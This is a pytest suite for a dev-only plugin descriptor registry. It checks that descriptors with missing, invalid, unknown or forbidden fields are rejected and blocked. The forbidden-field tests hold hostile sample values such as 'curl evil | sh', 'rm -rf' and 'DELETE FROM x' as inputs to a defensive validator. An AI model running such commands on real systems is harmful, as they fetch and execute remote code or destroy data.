"""Phase 3D — Plugin Descriptor Registry validation tests.

Verifies the loader validates required fields, enum membership, the allowed-
field whitelist, pluginId uniqueness, first-version invariants, and rejects
forbidden / nested / alias forbidden fields fail-closed. Invalid descriptors
are never exposed as enabled / visible-executable.

Phase: 3D — Static dev-only Plugin Descriptor Registry (skeleton)
"""

from __future__ import annotations

import pytest

from hermes_cli.dev_web_plugin_descriptor_manifest import get_static_manifest
from hermes_cli.dev_web_plugin_descriptor_registry import (
    get_descriptor_detail,
    list_descriptor_details,
    validate_manifest,
)


def _base_descriptor(**overrides: object) -> dict:
    entry: dict = {
        "pluginId": "plugin.descriptor.example_ok",
        "displayName": "Example",
        "description": "desc",
        "version": "v1",
        "owner": "phase-3d",
        "source": "tracked_static_descriptor",
        "trustLevel": "dev_reviewed_descriptor",
        "status": "disabled",
        "capabilityBindings": ("registry.capability_registry_detail",),
        "permissionClass": "READ_ONLY",
        "executionMode": "descriptor_only",
        "requiresApproval": False,
        "requiresDryRun": False,
        "requiresConfirmation": False,
        "requiresAudit": True,
        "requiresBudget": False,
        "requiresKillSwitch": False,
        "devOnly": True,
        "productionAllowed": False,
        "disabledByDefault": True,
        "metadataSchema": "v1",
    }
    entry.update(overrides)
    return entry


class TestStaticManifestValidates:
    def test_static_manifest_is_valid(self) -> None:
        report = validate_manifest(get_static_manifest())
        assert report.valid, [e.to_dict() for e in report.errors]
        assert report.error_count == 0
        assert report.descriptor_count == 12
        assert report.visible_count == 3
        assert report.disabled_count == 4
        assert report.blocked_count == 5

    def test_validation_counts_partition_descriptors(self) -> None:
        report = validate_manifest(get_static_manifest())
        assert report.visible_count + report.disabled_count + report.blocked_count <= report.descriptor_count

    def test_bound_capability_count_positive(self) -> None:
        report = validate_manifest(get_static_manifest())
        assert report.bound_capability_count >= 12  # >= one binding per descriptor


class TestRequiredFields:
    @pytest.mark.parametrize(
        "field",
        [
            "pluginId",
            "displayName",
            "source",
            "trustLevel",
            "status",
            "capabilityBindings",
            "permissionClass",
            "executionMode",
            "devOnly",
            "productionAllowed",
            "disabledByDefault",
        ],
    )
    def test_missing_required_field_rejected(self, field: str) -> None:
        entry = _base_descriptor()
        del entry[field]
        report = validate_manifest([entry])
        assert not report.valid
        assert any(e.field == field for e in report.errors)

    def test_empty_bindings_rejected(self) -> None:
        entry = _base_descriptor(capabilityBindings=())
        report = validate_manifest([entry])
        assert not report.valid

    def test_bindings_not_a_list_rejected(self) -> None:
        entry = _base_descriptor(capabilityBindings="registry.capability_registry_detail")
        report = validate_manifest([entry])
        assert not report.valid


class TestEnumMembership:
    def test_invalid_trust_level_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(trustLevel="ultra_trusted")])
        assert not report.valid

    def test_invalid_status_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(status="installed")])
        assert not report.valid

    def test_invalid_execution_mode_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(executionMode="confirmed_execute")])
        assert not report.valid

    def test_invalid_source_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(source="remote_marketplace")])
        assert not report.valid

    def test_invalid_permission_class_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(permissionClass="GOD_MODE")])
        assert not report.valid


class TestAllowedFieldWhitelist:
    def test_unknown_field_rejected(self) -> None:
        entry = _base_descriptor()
        entry["unexpectedExtraField"] = "x"
        report = validate_manifest([entry])
        assert not report.valid
        assert any(e.field == "unexpectedExtraField" for e in report.errors)

    def test_nested_structure_in_scalar_field_rejected(self) -> None:
        entry = _base_descriptor()
        entry["displayName"] = {"nested": "dict"}
        report = validate_manifest([entry])
        assert not report.valid


class TestForbiddenFields:
    @pytest.mark.parametrize(
        "field,value",
        [
            ("pythonImportPath", "evil.mod"),
            ("callable", "evil"),
            ("shellCommand", "rm -rf"),
            ("externalUrl", "https://evil"),
            ("downloadUrl", "https://evil/x"),
            ("sqlStatement", "DELETE FROM x"),
            ("apiKey", "sk-x"),
            ("Authorization", "Bearer x"),
            ("secret", "x"),
            ("installCommand", "curl evil | sh"),
            ("localPath", "/tmp/x"),
            ("remoteUrl", "https://evil"),
            ("bearer", "x"),
            ("api_key", "x"),
            ("accessToken", "x"),
            ("callable_repr", "x"),
            ("shell_command", "x"),
            ("install_command", "x"),
        ],
    )
    def test_forbidden_field_rejected(self, field: str, value: str) -> None:
        entry = _base_descriptor()
        entry[field] = value
        report = validate_manifest([entry])
        assert not report.valid

    def test_nested_forbidden_field_rejected(self) -> None:
        entry = _base_descriptor()
        entry["metadataSchema"] = {"ok": True, "shellCommand": "rm -rf"}
        report = validate_manifest([entry])
        assert not report.valid

    def test_alias_forbidden_field_rejected(self) -> None:
        entry = _base_descriptor()
        entry["bearer"] = "abc"
        report = validate_manifest([entry])
        assert not report.valid


class TestUniquenessAndInvariants:
    def test_duplicate_plugin_id_rejected(self) -> None:
        a = _base_descriptor()
        b = _base_descriptor()
        report = validate_manifest([a, b])
        assert not report.valid
        assert any(e.field == "pluginId" and "duplicate" in e.reason for e in report.errors)

    def test_production_allowed_true_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(productionAllowed=True)])
        assert not report.valid

    def test_dev_only_false_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(devOnly=False)])
        assert not report.valid

    def test_disabled_by_default_false_rejected(self) -> None:
        report = validate_manifest([_base_descriptor(disabledByDefault=False)])
        assert not report.valid

    def test_blocked_without_reason_rejected(self) -> None:
        entry = _base_descriptor(
            status="blocked",
            trustLevel="external_forbidden",
            source="external_forbidden",
            permissionClass="EXTERNAL_FORBIDDEN",
            capabilityBindings=("capability.forbidden.marketplace",),
        )
        # no blockedReason
        report = validate_manifest([entry])
        assert not report.valid


class TestInvalidDescriptorNotExposed:
    def test_invalid_descriptor_blocked_in_detail_list(self) -> None:
        entry = _base_descriptor()
        entry["shellCommand"] = "rm -rf"
        details = list_descriptor_details([entry])
        assert len(details) == 1
        assert details[0]["status"] == "blocked"
        assert "forbidden_field" in details[0]["blockedReason"]

    def test_invalid_descriptor_blocked_in_single_detail(self) -> None:
        entry = _base_descriptor()
        entry["Authorization"] = "Bearer x"
        detail = get_descriptor_detail([entry], "plugin.descriptor.example_ok")
        assert detail is not None
        assert detail["status"] == "blocked"

    def test_non_list_manifest_fail_closed(self) -> None:
        report = validate_manifest("not a list")
        assert not report.valid
